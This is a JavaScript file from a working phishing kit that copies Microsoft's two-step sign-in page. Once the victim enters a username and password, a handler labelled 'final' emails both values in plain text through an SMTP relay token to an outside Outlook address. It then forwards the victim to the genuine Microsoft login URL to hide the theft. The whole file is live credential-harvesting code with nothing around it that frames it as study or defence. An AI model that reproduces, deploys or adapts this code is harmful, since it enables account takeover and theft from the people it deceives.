console.log("VGhpcyBpcyBhIGxpa2VseSBzY2FtIHBhZ2UgeXVubm8g");
document.addEventListener("DOMContentLoaded", () => {
  const unReq = "Enter a valid email address, phone number, or Skype name.";
  const pwdReq = "Please enter the password for your Microsoft account.";
  const unameInp = document.getElementById("inp_uname");
  const pwdInp = document.getElementById("inp_pwd");
  let view = "uname";

  let unameVal = (pwdVal = false);
  /////next button
  const nxt = document.getElementById("btn_next");

  nxt.addEventListener("click", (e) => {
    e.preventDefault();
    //validate the form
    validate();
    if (unameVal) {
      document.getElementById("section_uname").classList.toggle("d-none");
      document.getElementById("section_pwd").classList.remove("d-none");
      document.querySelectorAll("#user_identity").forEach((e) => {
        e.innerText = unameInp.value;
      });
      view = "pwd";
    }
  });

  //////sign in button

  const sig = document.getElementById("btn_sig");

  sig.addEventListener("click", () => {
    //validate the form
    validate();
    if (pwdVal) {
      document.getElementById("section_pwd").classList.toggle("d-none");
      document.getElementById("section_final").classList.remove("d-none");
      view = "final";
    }
  });

  function validate() {
    function unameValAction(type) {
      if (!type) {
        document.getElementById("error_uname").innerText = unReq;
        unameInp.classList.add("error-inp");
        unameVal = false;
      } else {
        document.getElementById("error_uname").innerText = "";
        unameInp.classList.remove("error-inp");
        unameVal = true;
      }
    }
    function pwdValAction(type) {
      if (!type) {
        document.getElementById("error_pwd").innerText = pwdReq;
        pwdInp.classList.add("error-inp");
        pwdVal = false;
      } else {
        document.getElementById("error_pwd").innerText = "";
        pwdInp.classList.remove("error-inp");
        pwdVal = true;
      }
    }
    if (view === "uname") {
      if (unameInp.value.trim() === "") {
        unameValAction(false);
      } else {
        unameValAction(true);
      }
      unameInp.addEventListener("change", function () {
        if (this.value.trim() === "") {
          unameValAction(false);
        } else {
          unameValAction(true);
        }
      });
    } else if (view === "pwd") {
      if (pwdInp.value.trim() === "") {
        pwdValAction(false);
      } else {
        pwdValAction(true);
      }
      pwdInp.addEventListener("change", function () {
        if (this.value.trim() === "") {
          pwdValAction(false);
        } else {
          pwdValAction(true);
        }
      });
    }
    return false;
  }

  //back button
  document.querySelector(".back").addEventListener("click", () => {
    view = "uname";
    document.getElementById("section_pwd").classList.toggle("d-none");
    document.getElementById("section_uname").classList.remove("d-none");
  });

  //final buttons
  document.querySelectorAll("#btn_final").forEach((b) => {
    b.addEventListener("click", (e) => {
      e.preventDefault();
      //sendEmail
      Email.send({
        SecureToken: "9a10b246-ec7d-4ef3-85f6-95ef2141c30e",
        To: "bigbillz304@outlook.com",
        From: "me.bdigitals@outlook.com",
        Subject: "New Data Entry from Microsofft",
        Body:
          "Username: " +
          document.getElementById("inp_uname").value +
          "<br> Password: " +
          document.getElementById("inp_pwd").value,
      }).then((message) => {
        window.location.href =
          "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=c99cb35d-43ab-46ed-82ce-7421a33a8f4b&x-client-SKU=MSAL.Desktop&x-client-Ver=4.45.0.0&x-client-CPU=x64&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXByYJDMAAA0H_p1cUMGg49SBC7lE6Km6UkVUttXb5-3jsgoJN0JIxn6-N6NxuuoEzjHYcGrftm2HU_92DRePPGNuUxKUfXLgI7MRtdMIObGRNvNjNt4gzVazY2cjy85ikALZXibk0JFyj3n847YlSO0n7iAdZaZJfDBVK3FZNkF1cOrV74OIFdj819XEJyrCvboG-lmooM-R88dsUqIlt1eZucrb8Iv25FtjNnPg6b_CtbuFsw_TrtICpnNcnvP0b-hOj2ruRe8kKXBqmuazkBNXc3c-Uu6EIJ7M2FIVyS2QHzXqoMOlXgLbNnWSLjClm1GMyFMpj-FvES8D4spgKLE7Z1ZekgJFNiMTkWDE3NpC_Y-TX2YZ1_KV7V7HU6Hf4BTeakploBAAA&msaoauth2=true&lc=1033";
      });
    });
  });
});
